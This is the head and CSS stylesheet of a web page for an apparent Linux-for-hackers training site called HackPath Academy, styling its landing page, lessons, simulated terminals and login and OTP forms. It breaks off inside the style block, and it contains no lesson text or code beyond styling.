<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HackPath Academy ‚Äî Linux Basics for Hackers</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
:root{--bg:#0a0d0f;--surface:#0f1419;--surface2:#141c24;--border:#1e2d3d;--green:#00ff88;--gd:#00cc6a;--cyan:#00d4ff;--red:#ff3366;--orange:#ff8c00;--yellow:#ffd700;--text:#c9d1d9;--dim:#6e7681;--bright:#e6edf3;--mono:'Share Tech Mono',monospace;--disp:'Orbitron',sans-serif;--body:'Inter',sans-serif}
*{margin:0;padding:0;box-sizing:border-box}
body{background:var(--bg);color:var(--text);font-family:var(--body);min-height:100vh;overflow-x:hidden}
body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.012) 2px,rgba(0,255,136,.012) 4px);pointer-events:none;z-index:9999}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--border)}::-webkit-scrollbar-thumb:hover{background:var(--green)}

/* NAV */
nav{background:rgba(10,13,15,.97);border-bottom:1px solid var(--border);padding:0 1.5rem;display:flex;align-items:center;justify-content:space-between;height:62px;position:sticky;top:0;z-index:200;backdrop-filter:blur(12px)}
.nav-brand{font-family:var(--disp);font-weight:900;font-size:1.2rem;color:var(--green);letter-spacing:2px;text-shadow:0 0 20px rgba(0,255,136,.5);cursor:pointer}
.nav-brand span{color:var(--cyan)}
.nav-status{display:flex;gap:1.2rem;font-family:var(--mono);font-size:.65rem;color:var(--dim)}
.si{display:flex;align-items:center;gap:.35rem}
.dot{width:6px;height:6px;border-radius:50%;animation:pulse 2s infinite}
.dot.g{background:var(--green);box-shadow:0 0 6px var(--green)}.dot.c{background:var(--cyan);box-shadow:0 0 6px var(--cyan)}.dot.o{background:var(--orange);box-shadow:0 0 6px var(--orange);animation-delay:.5s}.dot.r{background:var(--red);box-shadow:0 0 6px var(--red);animation-delay:1s}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
.nav-links{display:flex;gap:.4rem}
.nb{background:none;border:1px solid var(--border);color:var(--dim);padding:.4rem .85rem;font-family:var(--mono);font-size:.65rem;letter-spacing:1px;cursor:pointer;transition:all .2s;text-transform:uppercase}
.nb:hover,.nb.active{border-color:var(--green);color:var(--green);background:rgba(0,255,136,.05)}
.nb.pro{border-color:var(--orange)!important;color:var(--orange)!important}
.nb.pro:hover{background:rgba(255,140,0,.06)!important}

/* VIEWS */
.view{display:none}.view.active{display:block}

/* HOME */
.hero{padding:3.5rem 2rem 2.5rem;max-width:1200px;margin:0 auto}
.htag{font-family:var(--mono);font-size:.65rem;color:var(--cyan);letter-spacing:3px;text-transform:uppercase;margin-bottom:.8rem;opacity:0;animation:fadeUp .5s forwards .1s}
.hero h1{font-family:var(--disp);font-size:clamp(1.8rem,4vw,3rem);font-weight:900;color:var(--bright);line-height:1.1;margin-bottom:1.2rem;opacity:0;animation:fadeUp .5s forwards .3s}
.hero h1 .acc{color:var(--green);text-shadow:0 0 30px rgba(0,255,136,.4)}
.hdesc{font-size:.9rem;color:var(--dim);max-width:580px;line-height:1.7;margin-bottom:1.8rem;opacity:0;animation:fadeUp .5s forwards .5s}
@keyframes fadeUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
.hstats{display:flex;gap:1.8rem;margin-bottom:2rem;flex-wrap:wrap;opacity:0;animation:fadeUp .5s forwards .7s}
.stat{border-left:2px solid var(--green);padding-left:.9rem}
.sn{font-family:var(--disp);font-size:1.4rem;color:var(--green);font-weight:700}
.sl{font-family:var(--mono);font-size:.6rem;color:var(--dim);text-transform:uppercase;letter-spacing:1px}
.hact{display:flex;gap:.8rem;opacity:0;animation:fadeUp .5s forwards .9s}
.btn-p{background:var(--green);color:var(--bg);border:none;padding:.75rem 1.8rem;font-family:var(--disp);font-size:.72rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:all .2s;clip-path:polygon(0 0,calc(100% - 8px) 0,100% 8px,100% 100%,8px 100%,0 calc(100% - 8px))}
.btn-p:hover{background:var(--gd);box-shadow:0 0 28px rgba(0,255,136,.4);transform:translateY(-2px)}
.btn-s{background:transparent;color:var(--cyan);border:1px solid var(--cyan);padding:.75rem 1.8rem;font-family:var(--mono);font-size:.7rem;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:all .2s}
.btn-s:hover{background:rgba(0,212,255,.07);box-shadow:0 0 18px rgba(0,212,255,.2)}
.alert-box{background:rgba(0,255,136,.05);border:1px solid rgba(0,255,136,.2);border-left:3px solid var(--green);padding:.9rem 1.4rem;margin:0 2rem 2rem;max-width:1200px;margin-left:auto;margin-right:auto;display:flex;align-items:center;gap:.8rem;font-family:var(--mono);font-size:.75rem;color:var(--green)}
.sec-label{font-family:var(--mono);font-size:.65rem;color:var(--cyan);letter-spacing:4px;text-transform:uppercase;padding:0 2rem;max-width:1200px;margin:0 auto 1.2rem;display:flex;align-items:center;gap:1rem}
.sec-label::after{content:'';flex:1;height:1px;background:linear-gradient(to right,var(--border),transparent)}
.mgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:1rem;padding:0 2rem 4rem;max-width:1200px;margin:0 auto}
.mc{background:var(--surface);border:1px solid var(--border);padding:1.4rem;cursor:pointer;transition:all .22s;position:relative;overflow:hidden}
.mc::before{content:'';position:absolute;top:0;left:0;width:100%;height:2px;background:linear-gradient(to right,var(--green),var(--cyan));transform:scaleX(0);transform-origin:left;transition:transform .3s}
.mc:hover::before{transform:scaleX(1)}
.mc:hover{border-color:rgba(0,255,136,.3);background:var(--surface2);transform:translateY(-3px);box-shadow:0 8px 28px rgba(0,255,136,.09)}
.mc.done{border-left:3px solid var(--green)}
.mh{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:.7rem}
.mn{font-family:var(--disp);font-size:.6rem;color:var(--dim);letter-spacing:2px}
.mbadge{font-family:var(--mono);font-size:.55rem;padding:.15rem .45rem;border:1px solid;letter-spacing:1px;text-transform:uppercase}
.bl{border-color:var(--green);color:var(--green)}.bd{border-color:var(--cyan);color:var(--cyan)}
.mi{font-size:1.8rem;margin-bottom:.7rem}
.mt{font-family:var(--disp);font-size:.78rem;font-weight:700;color:var(--bright);letter-spacing:1px;text-transform:uppercase;margin-bottom:.4rem}
.md{font-size:.78rem;color:var(--dim);line-height:1.5;margin-bottom:.9rem}
.mm{display:flex;gap:.9rem;font-family:var(--mono);font-size:.6rem;color:var(--dim)}
.mprog{margin-top:.9rem;height:2px;background:var(--border)}
.mpf{height:100%;background:linear-gradient(to right,var(--green),var(--cyan));transition:width .5s ease}
.prog-panel{background:var(--surface2);border:1px solid var(--border);padding:1rem 1.5rem;margin-bottom:2rem;display:flex;align-items:center;gap:2rem}
.op{flex:1}.opl{font-family:var(--mono);font-size:.6rem;color:var(--dim);letter-spacing:2px;text-transform:uppercase;margin-bottom:.4rem;display:flex;justify-content:space-between}
.opb{height:3px;background:var(--border)}.opf{height:100%;background:linear-gradient(to right,var(--green),var(--cyan));transition:width .5s}
.opn{font-family:var(--disp);font-size:1.8rem;color:var(--green);font-weight:700;white-space:nowrap}

/* LESSON LAYOUT */
.ll{display:flex;height:calc(100vh - 62px)}
.lsb{width:270px;background:var(--surface);border-right:1px solid var(--border);overflow-y:auto;flex-shrink:0}
.sbh{padding:1rem;border-bottom:1px solid var(--border);font-family:var(--disp);font-size:.65rem;letter-spacing:2px;color:var(--green);text-transform:uppercase}
.sch{border-bottom:1px solid var(--border)}
.sct{padding:.75rem 1rem;font-family:var(--mono);font-size:.65rem;color:var(--dim);cursor:pointer;display:flex;align-items:center;justify-content:space-between;background:none;border:none;width:100%;text-align:left;transition:color .2s;letter-spacing:1px;text-transform:uppercase}
.sct:hover{color:var(--bright)}.sct.act{color:var(--green)}
.sls{display:none}.sls.open{display:block}
.sl-item{padding:.55rem 1rem .55rem 1.8rem;font-size:.75rem;color:var(--dim);cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:.5rem;border:none;background:none;width:100%;text-align:left}
.sl-item:hover{color:var(--bright);background:rgba(255,255,255,.03)}
.sl-item.act{color:var(--green);background:rgba(0,255,136,.05);border-right:2px solid var(--green)}
.sl-item.done-l::before{content:'‚úì';color:var(--green);margin-right:.2rem;font-size:.65rem;font-family:var(--mono)}
.lmain{flex:1;overflow-y:auto;padding:0}
.lca{max-width:840px;margin:0 auto;padding:2rem}
.lbread{font-family:var(--mono);font-size:.62rem;color:var(--dim);letter-spacing:1px;margin-bottom:1.2rem}
.lbread span{color:var(--green)}
.ltitle{font-family:var(--disp);font-size:1.4rem;font-weight:900;color:var(--bright);letter-spacing:2px;text-transform:uppercase;margin-bottom:.4rem}
.lsub{font-family:var(--mono);font-size:.75rem;color:var(--cyan);margin-bottom:1.8rem;padding-bottom:1rem;border-bottom:1px solid var(--border)}
.lb p{font-size:.88rem;line-height:1.85;color:var(--text);margin-bottom:1.1rem}
.lb h3{font-family:var(--disp);font-size:.82rem;color:var(--cyan);letter-spacing:2px;text-transform:uppercase;margin:1.8rem 0 .8rem;padding-left:.8rem;border-left:2px solid var(--cyan)}
.lb h4{font-family:var(--mono);font-size:.78rem;color:var(--orange);letter-spacing:1px;margin:1.2rem 0 .6rem}
.lb ul{margin:.5rem 0 1rem 1.5rem;font-size:.86rem;line-height:1.8;color:var(--text)}
.lb li{margin-bottom:.3rem}
.lb code,.lb pre code{background:rgba(0,255,136,.08);color:var(--green);padding:.08rem .35rem;font-family:var(--mono);font-size:.8em;border:1px solid rgba(0,255,136,.18);border-radius:2px}
.lb table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.82rem}
.lb th{background:var(--surface2);color:var(--cyan);font-family:var(--mono);font-size:.68rem;letter-spacing:1px;text-transform:uppercase;padding:.6rem .8rem;text-align:left;border:1px solid var(--border)}
.lb td{padding:.55rem .8rem;border:1px solid var(--border);color:var(--text);vertical-align:top}
.lb tr:nth-child(even) td{background:rgba(255,255,255,.02)}

/* TERMINAL */
.term{background:#0d1117;border:1px solid var(--border);border-top:2px solid var(--green);margin:1.4rem 0;font-family:var(--mono);font-size:.8rem}
.th{display:flex;align-items:center;gap:.5rem;padding:.55rem .9rem;border-bottom:1px solid var(--border);background:var(--surface)}
.td{width:10px;height:10px;border-radius:50%}.td-r{background:#ff5f56}.td-o{background:#ffbd2e}.td-g{background:#27c93f}
.tl{font-size:.6rem;color:var(--dim);margin-left:.4rem;letter-spacing:1px}
.tb{padding:.9rem 1rem;line-height:1.9}
.tp{color:var(--green)}.tc{color:var(--bright)}.to{color:var(--dim)}.tcom{color:#4e6a85}
.tcyan{color:var(--cyan)}.tred{color:var(--red)}.tyel{color:var(--yellow)}
.cursor{animation:blink 1s infinite}
@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}




/* =================== LANDING PAGE =================== */
#view-landing{display:none;min-height:100vh;background:var(--bg);overflow-x:hidden;position:relative}

/* Animated grid background */
.land-grid-bg{
  position:fixed;inset:0;pointer-events:none;z-index:0;
  background-image:
    linear-gradient(rgba(0,255,136,.04) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0,255,136,.04) 1px, transparent 1px);
  background-size:60px 60px;
  mask-image:radial-gradient(ellipse 80% 80% at 50% 50%, black 40%, transparent 100%);
}
.land-scanline{position:fixed;inset:0;pointer-events:none;z-index:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,136,.008) 3px,rgba(0,255,136,.008) 4px)}

/* Land nav */
.land-nav{
  position:fixed;top:0;left:0;right:0;z-index:100;
  display:flex;align-items:center;justify-content:space-between;
  padding:0 2.5rem;height:64px;
  background:rgba(10,13,15,.85);
  border-bottom:1px solid rgba(0,255,136,.08);
  backdrop-filter:blur(16px);
}
.land-nav-brand{font-family:var(--disp);font-size:1.1rem;font-weight:900;color:var(--bright);letter-spacing:3px;cursor:pointer}
.land-nav-brand span{color:var(--green)}
.land-nav-links{display:flex;align-items:center;gap:.5rem}
.land-nav-btn{background:none;border:1px solid var(--border);color:var(--dim);font-family:var(--mono);font-size:.65rem;letter-spacing:1.5px;padding:.45rem 1rem;cursor:pointer;text-transform:uppercase;transition:all .2s}
.land-nav-btn:hover{border-color:var(--green);color:var(--green)}
.land-nav-cta{background:var(--green);color:#040d04;border:none;font-family:var(--disp);font-size:.65rem;font-weight:900;letter-spacing:2px;padding:.45rem 1.2rem;cursor:pointer;text-transform:uppercase;transition:all .2s;clip-path:polygon(0 0,calc(100% - 8px) 0,100% 8px,100% 100%,8px 100%,0 calc(100% - 8px))}
.land-nav-cta:hover{background:#00cc6a;box-shadow:0 0 20px rgba(0,255,136,.3)}

/* Hero */
.land-hero{
  position:relative;z-index:1;
  min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;
  padding:100px 2rem 4rem;text-align:center;
}
.land-eyebrow{
  display:inline-flex;align-items:center;gap:.6rem;
  font-family:var(--mono);font-size:.62rem;color:var(--green);letter-spacing:4px;text-transform:uppercase;
  background:rgba(0,255,136,.06);border:1px solid rgba(0,255,136,.15);
  padding:.4rem 1rem;margin-bottom:2rem;
  animation:fadeUp .6s forwards;opacity:0;
}
.land-eyebrow::before{content:'';width:6px;height:6px;background:var(--green);border-radius:50%;animation:blink 1.4s infinite}
.land-h1{
  font-family:var(--disp);font-weight:900;color:var(--bright);
  font-size:clamp(2.2rem,7vw,5rem);
  line-height:1.05;letter-spacing:-1px;
  margin-bottom:1.2rem;
  animation:fadeUp .6s .12s forwards;opacity:0;
}
.land-h1 .acc-g{color:var(--green)}
.land-h1 .acc-c{color:var(--cyan)}
.land-sub{
  font-size:clamp(.9rem,2vw,1.1rem);color:var(--dim);
  max-width:560px;line-height:1.75;margin:0 auto 2.5rem;
  animation:fadeUp .6s .22s forwards;opacity:0;
}
.land-ctas{
  display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;
  animation:fadeUp .6s .32s forwards;opacity:0;margin-bottom:3.5rem;
}
.land-cta-primary{
  background:var(--green);color:#030c03;border:none;
  font-family:var(--disp);font-size:.8rem;font-weight:900;letter-spacing:2px;text-transform:uppercase;
  padding:.9rem 2rem;cursor:pointer;
  clip-path:polygon(0 0,calc(100% - 10px) 0,100% 10px,100% 100%,10px 100%,0 calc(100% - 10px));
  transition:all .25s;
}
.land-cta-primary:hover{background:#00cc6a;box-shadow:0 0 40px rgba(0,255,136,.35);transform:translateY(-2px)}
.land-cta-secondary{
  background:transparent;color:var(--bright);
  border:1px solid rgba(255,255,255,.15);
  font-family:var(--mono);font-size:.75rem;letter-spacing:2px;text-transform:uppercase;
  padding:.9rem 2rem;cursor:pointer;transition:all .25s;
}
.land-cta-secondary:hover{border-color:var(--cyan);color:var(--cyan)}

/* Stats bar */
.land-stats{
  display:flex;gap:0;border:1px solid var(--border);
  animation:fadeUp .6s .42s forwards;opacity:0;
  flex-wrap:wrap;justify-content:center;
  max-width:700px;width:100%;
}
.land-stat{
  flex:1;min-width:120px;padding:1.2rem 1.5rem;text-align:center;
  border-right:1px solid var(--border);position:relative;
}
.land-stat:last-child{border-right:none}
.land-stat-n{font-family:var(--disp);font-size:1.8rem;font-weight:900;color:var(--green);line-height:1;margin-bottom:.2rem}
.land-stat-l{font-family:var(--mono);font-size:.6rem;color:var(--dim);letter-spacing:2px;text-transform:uppercase}

/* Scroll indicator */
.land-scroll{
  position:absolute;bottom:2rem;left:50%;transform:translateX(-50%);
  font-family:var(--mono);font-size:.58rem;color:var(--dim);letter-spacing:2px;text-transform:uppercase;
  display:flex;flex-direction:column;align-items:center;gap:.5rem;
  animation:fadeUp .6s .7s forwards;opacity:0;
}
.land-scroll-arrow{width:1px;height:30px;background:linear-gradient(to bottom,var(--green),transparent);animation:scrollPulse 1.8s infinite}
@keyframes scrollPulse{0%,100%{opacity:.3;transform:scaleY(.8)}50%{opacity:1;transform:scaleY(1)}}

/* Section wrapper */
.land-section{position:relative;z-index:1;padding:5rem 2rem;max-width:1140px;margin:0 auto}
.land-section-full{position:relative;z-index:1;padding:5rem 0;background:var(--surface);border-top:1px solid var(--border);border-bottom:1px solid var(--border)}
.land-section-inner{max-width:1140px;margin:0 auto;padding:0 2rem}
.land-tag{font-family:var(--mono);font-size:.62rem;color:var(--cyan);letter-spacing:4px;text-transform:uppercase;margin-bottom:.8rem;display:flex;align-items:center;gap:.6rem}
.land-tag::before{content:'//'}
.land-h2{font-family:var(--disp);font-size:clamp(1.5rem,3.5vw,2.4rem);font-weight:900;color:var(--bright);margin-bottom:.6rem;line-height:1.1;letter-spacing:-0.5px}
.land-h2 span{color:var(--green)}
.land-p{color:var(--dim);font-size:.95rem;line-height:1.8;max-width:520px;margin-bottom:2rem}

/* Features grid */
.land-feat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:1px;background:var(--border);border:1px solid var(--border)}
.land-feat{background:var(--bg);padding:2rem;transition:background .2s}
.land-feat:hover{background:rgba(0,255,136,.03)}
.land-feat-icon{font-size:1.8rem;margin-bottom:1rem;display:block}
.land-feat-title{font-family:var(--disp);font-size:.85rem;font-weight:700;color:var(--bright);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:.6rem}
.land-feat-desc{font-family:var(--body);font-size:.84rem;color:var(--dim);line-height:1.7}
.land-feat-tag{display:inline-block;font-family:var(--mono);font-size:.55rem;color:var(--green);letter-spacing:2px;background:rgba(0,255,136,.07);border:1px solid rgba(0,255,136,.15);padding:.2rem .6rem;margin-top:.8rem;text-transform:uppercase}

/* Modules preview */
.land-modules{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:.75rem;margin-top:2rem}
.land-module{background:var(--surface);border:1px solid var(--border);padding:1rem 1.2rem;transition:all .2s;cursor:default}
.land-module:hover{border-color:rgba(0,255,136,.3);background:rgba(0,255,136,.03);transform:translateY(-2px)}
.land-module-num{font-family:var(--mono);font-size:.55rem;color:var(--dim);letter-spacing:2px;margin-bottom:.3rem}
.land-module-icon{font-size:1.2rem;margin-bottom:.4rem;display:block}
.land-module-title{font-family:var(--disp);font-size:.68rem;font-weight:700;color:var(--bright);letter-spacing:1px;text-transform:uppercase;line-height:1.3}

/* Testimonials */
.land-testi-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.2rem;margin-top:2rem}
.land-testi{background:var(--surface);border:1px solid var(--border);border-left:3px solid var(--green);padding:1.5rem}
.land-testi-text{font-size:.88rem;color:var(--text);line-height:1.75;margin-bottom:1rem;font-style:italic}
.land-testi-author{display:flex;align-items:center;gap:.8rem}
.land-testi-avatar{width:34px;height:34px;background:linear-gradient(135deg,var(--green),var(--cyan));display:flex;align-items:center;justify-content:center;font-family:var(--disp);font-size:.65rem;font-weight:900;color:#050a05;flex-shrink:0}
.land-testi-name{font-family:var(--mono);font-size:.65rem;color:var(--bright);letter-spacing:1px}
.land-testi-role{font-family:var(--mono);font-size:.58rem;color:var(--dim)}

/* CTA section */
.land-cta-section{position:relative;z-index:1;background:linear-gradient(135deg,rgba(0,255,136,.06) 0%,rgba(0,212,255,.04) 100%);border-top:1px solid rgba(0,255,136,.12);border-bottom:1px solid rgba(0,255,136,.12);padding:5rem 2rem;text-align:center}
.land-cta-h{font-family:var(--disp);font-size:clamp(1.5rem,4vw,2.8rem);font-weight:900;color:var(--bright);margin-bottom:.8rem;letter-spacing:-0.5px}
.land-cta-sub{font-family:var(--mono);font-size:.75rem;color:var(--dim);letter-spacing:2px;margin-bottom:2.5rem}

/* Footer */
.land-footer{position:relative;z-index:1;background:var(--surface);border-top:1px solid var(--border);padding:2.5rem 2rem;text-align:center}
.land-footer-brand{font-family:var(--disp);font-size:1rem;font-weight:900;color:var(--bright);letter-spacing:3px;margin-bottom:.4rem}
.land-footer-brand span{color:var(--green)}
.land-footer-sub{font-family:var(--mono);font-size:.6rem;color:var(--dim);letter-spacing:2px}

/* Terminal mockup */
.land-term-mock{
  background:#0a0e14;border:1px solid var(--border);border-top:2px solid var(--green);
  max-width:640px;margin:0 auto;font-family:var(--mono);font-size:.82rem;
  animation:fadeUp .6s .5s forwards;opacity:0;
}
.land-term-head{display:flex;align-items:center;gap:.4rem;padding:.55rem .9rem;background:var(--surface);border-bottom:1px solid var(--border)}
.land-term-dot{width:10px;height:10px;border-radius:50%}
.land-term-body{padding:1rem 1.2rem;line-height:2}
.lt-p{color:var(--green)}.lt-c{color:var(--bright)}.lt-o{color:var(--dim)}.lt-g{color:#27c93f}.lt-r{color:var(--red)}.lt-info{color:var(--cyan)}
.lt-cursor{display:inline-block;width:8px;height:1em;background:var(--green);vertical-align:text-bottom;animation:blink 1s infinite;margin-left:1px}

@media(max-width:640px){
  .land-nav{padding:0 1rem}
  .land-nav-links .land-nav-btn{display:none}
  .land-hero{padding:80px 1.2rem 3rem}
  .land-stat{min-width:90px;padding:.9rem 1rem}
  .land-section{padding:3.5rem 1.2rem}
  .land-modules{grid-template-columns:repeat(2,1fr)}
}

@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}


/* =================== OTP VERIFICATION PANEL =================== */
#panel-otp{ display:none }
#panel-otp.active{ display:block }
.otp-email-display{
  font-family:var(--mono);font-size:.72rem;color:var(--cyan);
  background:rgba(34,212,255,.06);border:1px solid rgba(34,212,255,.15);
  padding:.6rem 1rem;margin-bottom:1.4rem;letter-spacing:.5px;
  word-break:break-all;
}
.otp-inputs{
  display:flex;gap:.6rem;justify-content:center;margin:1.2rem 0;
}
.otp-digit{
  width:48px;height:58px;
  background:var(--bg);border:1px solid var(--border);
  color:var(--bright);font-family:var(--disp);font-size:1.4rem;font-weight:900;
  text-align:center;outline:none;transition:border-color .2s;
  -webkit-appearance:none;border-radius:0;
}
.otp-digit:focus{ border-color:var(--green);box-shadow:0 0 0 3px rgba(0,255,136,.08) }
.otp-digit.filled{ border-color:rgba(0,255,136,.4);color:var(--green) }
.otp-digit.error{ border-color:var(--red);animation:shake .3s ease }
@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}
.otp-timer{
  font-family:var(--mono);font-size:.65rem;color:var(--dim);
  text-align:center;margin:.8rem 0;letter-spacing:1px;
}
.otp-timer.expired{ color:var(--red) }
.otp-timer span{ color:var(--yellow);font-weight:700 }
.otp-resend{
  background:none;border:none;color:var(--cyan);font-family:var(--mono);
  font-size:.65rem;letter-spacing:1px;cursor:pointer;text-decoration:underline;
  text-transform:uppercase;padding:0;transition:opacity .2s;
}
.otp-resend:disabled{ opacity:.3;cursor:not-allowed;text-decoration:none }
.otp-sending{ display:flex;align-items:center;gap:.6rem;justify-content:center;padding:.5rem 0 }
.otp-sending-dot{ width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 1.2s infinite }
.otp-sending-dot:nth-child(2){ animation-delay:.2s }
.otp-sending-dot:nth-child(3){ animation-delay:.4s }
@keyframes pulse{0%,100%{opacity:.2;transform:scale(.8)}50%{opacity:1;transform:scale(1.2)}}
.af-btn-outline{
  width:100%;background:transparent;color:var(--dim);
  border:1px solid var(--border);
  padding:.7rem;font-family:var(--mono);font-size:.68rem;
  letter-spacing:1.5px;text-transform:uppercase;cursor:pointer;
  transition:all .2s;margin-top:.5rem;
}
.af-btn-outline:hover{ border-color:var(--dim);color:var(--bright) }
.strength-bar{ height:3px;background:var(--border);margin-top:.4rem;position:relative;overflow:hidden }
.strength-fill{ height:100%;width:0%;transition:width .3s,background .3s }
.strength-label{ font-family:var(--mono);font-size:.58rem;color:var(--dim);margin-top:.25rem;letter-spacing:1px }

/* =================== AUTH SCREEN =================== */
#view-auth{display:flex;min-height:100vh;background:var(--bg);align-items:center;justify-content:center;padding:2rem 1rem}
.auth-card{width:100%;max-width:420px;background:var(--surface);border:1px solid var(--border);position:relative;overflow:hidden}
.auth-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--green),var(--cyan))}
.auth-logo{padding:2rem 2rem 1rem;text-align:center}
.auth-logo-brand{font-family:var(--disp);font-size:1.6rem;font-weight:900;color:var(--bright);letter-spacing:3px}
.auth-logo-brand span{color:var(--green)}
.auth-logo-sub{font-family:var(--mono);font-size:.6rem;color:var(--dim);letter-spacing:3px;text-transform:uppercase;margin-top:.3rem}
.auth-tabs{display:flex;border-bottom:1px solid var(--border)}
.auth-tab{flex:1;padding:.85rem;font-family:var(--mono);font-size:.7rem;letter-spacing:2px;text-transform:uppercase;background:none;border:none;color:var(--dim);cursor:pointer;transition:all .2s;border-bottom:2px solid transparent;margin-bottom:-1px}
.auth-tab.active{color:var(--green);border-bottom-color:var(--green);background:rgba(0,255,136,.03)}
.auth-body{padding:1.8rem 2rem 2rem}
.auth-panel{display:none}.auth-panel.active{display:block}
.af-group{margin-bottom:1.2rem}
.af-label{font-family:var(--mono);font-size:.6rem;color:var(--dim);letter-spacing:2px;text-transform:uppercase;margin-bottom:.4rem;display:block}
.af-input{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--bright);padding:.75rem 1rem;font-family:var(--mono);font-size:.82rem;outline:none;transition:border-color .2s;-webkit-appearance:none}
.af-input:focus{border-color:var(--green);box-shadow:0 0 0 3px rgba(0,255,136,.06)}
.af-input::placeholder{color:var(--dim)}
.af-btn{width:100%;background:var(--green);color:#040d04;border:none;padding:.85rem;font-family:var(--disp);font-size:.75rem;font-weight:900;letter-spacing:2px;text-transform:uppercase;cursor:pointer;transition:all .2s;margin-top:.5rem}
.af-btn:hover{background:#00cc6a;box-shadow:0 0 20px rgba(0,255,136,.25)}
.af-btn:active{transform:scale(.99)}
.af-err{font-family:var(--mono);font-size:.7rem;color:var(--red);margin-top:.8rem;text-align:center;min-height:1.2rem;letter-spacing:.5px}
.af-ok{font-family:var(--mono);font-size:.7rem;color:var(--green);margin-top:.8rem;text-align:center;min-height:1.2rem;letter-spacing:.5px}
.af-footer{font-family:var(--mono);font-size:.62rem;color:var(--dim);text-align:center;margin-top:1.4rem;letter-spacing:.5px;line-height:1.7}
.af-footer a{color:var(--cyan);cursor:pointer;text-decoration:none}
.auth-features{display:flex;gap:.8rem;padding:0 2rem 2rem;flex-wrap:wrap}
.auth-feat{flex:1;min-width:100px;background:rgba(0,255,136,.03);border:1px solid rgba(0,255,136,.08);padding:.7rem .8rem;text-align:center}
.auth-feat-icon{font-size:1.1rem;margin-bottom:.3rem}
.auth-feat-label{font-family:var(--mono);font-size:.58rem;color:var(--dim);letter-spacing:1px;text-transform:uppercase}

/* Nav user badge */
.nav-user{display:flex;align-items:center;gap:.5rem;font-family:var(--mono);font-size:.65rem;color:var(--green)}
.nav-avatar{width:26px;height:26px;background:linear-gradient(135deg,var(--green),var(--cyan));display:flex;align-items:center;justify-content:center;font-family:var(--disp);font-size:.6rem;font-weight:900;color:#050a05;flex-shrink:0}
.nav-logout{background:none;border:1px solid var(--border);color:var(--dim);font-family:var(--mono);font-size:.58rem;letter-spacing:1px;padding:.25rem .6rem;cursor:pointer;transition:all .2s;text-transform:uppercase}
.nav-logout:hover{border-color:var(--red);color:var(--red)}

/* INTERACTIVE TERMINAL */
.iterm{background:#0a0e14;border:1px solid var(--border);border-top:2px solid var(--green);margin:1.4rem 0;font-family:var(--mono);font-size:.8rem;overflow:hidden}
.iterm-head{display:flex;align-items:center;gap:.5rem;padding:.55rem .9rem;border-bottom:1px solid var(--border);background:#0d1520;user-select:none}
.iterm-dots{display:flex;gap:.4rem}.iterm-dot{width:10px;height:10px;border-radius:50%}
.iterm-dot.r{background:#ff5f56}.iterm-dot.o{background:#ffbd2e}.iterm-dot.g{background:#27c93f}
.iterm-label{font-size:.6rem;color:var(--dim);margin-left:.4rem;letter-spacing:1px;flex:1}
.iterm-hint{font-size:.55rem;color:rgba(57,255,133,.35);letter-spacing:.5px}
.iterm-body{padding:.6rem 1rem 0;min-height:80px;max-height:340px;overflow-y:auto;overflow-x:hidden}
.iterm-history{line-height:2;word-break:break-word;white-space:pre-wrap}
.iterm-history .h-cmd{color:var(--bright)}
.iterm-history .h-prompt{color:var(--green)}
.iterm-history .h-out{color:var(--dim)}
.iterm-history .h-ok{color:#27c93f}
.iterm-history .h-err{color:var(--red)}
.iterm-history .h-info{color:var(--cyan)}
.iterm-input-row{display:flex;align-items:center;padding:.5rem 0 .7rem;gap:.4rem;flex-wrap:nowrap;min-width:0}
.iterm-prompt-str{color:var(--green);white-space:nowrap;flex-shrink:0}
.iterm-input{background:transparent;border:none;outline:none;color:var(--bright);font-family:var(--mono);font-size:.8rem;flex:1;caret-color:var(--green);width:100%;min-width:0}
.iterm-input::placeholder{color:rgba(255,255,255,.15)}
/* INFO BOXES */
.ibox{background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.2);border-left:3px solid var(--cyan);padding:.9rem 1.1rem;margin:1.3rem 0;font-size:.84rem;line-height:1.65}
.ibox .il{font-family:var(--mono);font-size:.6rem;color:var(--cyan);letter-spacing:2px;text-transform:uppercase;margin-bottom:.35rem}
.wbox{background:rgba(255,140,0,.05);border:1px solid rgba(255,140,0,.2);border-left:3px solid var(--orange);padding:.9rem 1.1rem;margin:1.3rem 0;font-size:.84rem;line-height:1.65}
.wbox .il{font-family:var(--mono);font-size:.6rem;color:var(--orange);letter-spacing:2px;text-transform:uppercase;margin-bottom:.35rem}
.rbox{background:rgba(255,51,102,.05);border:1px solid rgba(255,51,102,.2);border-left:3px solid var(--red);padding:.9rem 1.1rem;margin:1.3rem 0;font-size:.84rem;line-height:1.65}
